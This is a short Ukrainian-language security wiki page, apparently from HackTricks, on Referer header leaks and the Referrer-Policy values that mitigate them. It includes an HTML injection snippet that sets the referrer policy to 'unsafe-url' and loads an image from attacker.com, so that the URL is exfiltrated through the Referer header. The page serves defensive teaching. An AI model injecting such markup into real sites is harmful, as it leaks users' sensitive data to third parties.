# Цікавий HTTP

{{#include ../banners/hacktricks-training.md}}

## Заголовки Referrer і policy

Referrer - це заголовок, який браузери використовують, щоб указати, яка сторінка була відвідана попередньою.

### Витік конфіденційної інформації

Якщо в певний момент усередині вебсторінки будь-яка конфіденційна інформація міститься в параметрах GET-запиту, а сторінка містить посилання на зовнішні джерела або зловмисник може змусити/запропонувати (за допомогою social engineering) користувачу відвідати URL, контрольований зловмисником, він може ексфільтрувати конфіденційну інформацію з останнього GET-запиту.

### Mitigation

Можна налаштувати браузер на використання **Referrer-policy**, яка може **запобігти** надсиланню конфіденційної інформації до інших вебзастосунків:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Контрзаходи

Ви можете обійти це правило за допомогою HTML meta tag (зловмиснику потрібно здійснити HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Захист

Ніколи не розміщуйте конфіденційні дані в параметрах GET або шляхах URL.

{{#include ../banners/hacktricks-training.md}}
